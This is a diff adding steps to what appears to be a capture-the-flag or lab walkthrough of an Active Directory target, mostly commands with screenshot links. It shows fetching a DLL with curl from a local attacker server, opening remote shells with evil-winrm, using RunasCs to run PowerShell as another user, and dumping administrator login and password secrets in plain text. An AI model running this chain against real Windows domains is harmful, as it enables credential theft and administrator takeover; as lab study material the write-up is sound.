@@ -33,4 +33,26 @@ curl -O http://192.168.100.IP:8000/TextShaping.dll
 
 ![image](https://github.com/stensil4rt/CodeBy/assets/62753044/5e7d7ba3-ddf7-4b65-b9b5-c0ebf5f984c9)
 
+https://github.com/antonioCoco/RunasCs
+
+![image](https://github.com/stensil4rt/CodeBy/assets/62753044/288e71b3-ab6a-471e-9856-28201fb91477)
+```
+evil-winrm -i 192.168.2.8 -u LOGIN -p PASS -s ~/CodeBy/AD/Hhran
+```
+![image](https://github.com/stensil4rt/CodeBy/assets/62753044/9c6718d9-e431-40ba-87fc-0835d4cf35cc)
+```
+Invoke-RunasCs LOGIN PASS "powershell -c Get-SecretInfo" -d CODEBY
+```
+![image](https://github.com/stensil4rt/CodeBy/assets/62753044/a8f4f008-9925-4b39-8ce8-9fc872d01413)
+```
+Invoke-RunasCs LOGIN PASS "powershell -c Get-Secret -Name AdmLogin -AsPlainText" -d CODEBY
+```
+```
+Invoke-RunasCs LOGIN PASS "powershell -c Get-Secret -Name AdmPassword -AsPlainText" -d CODEBY
+```
+![image](https://github.com/stensil4rt/CodeBy/assets/62753044/ed7e7156-f73c-4831-b05c-fedfba56de0e)
+```
+evil-winrm -i 192.168.2.8 -u Administrator -p PASS
+```
+![image](https://github.com/stensil4rt/CodeBy/assets/62753044/eb8dd166-5bda-42a5-aba6-f9030a231220)
 
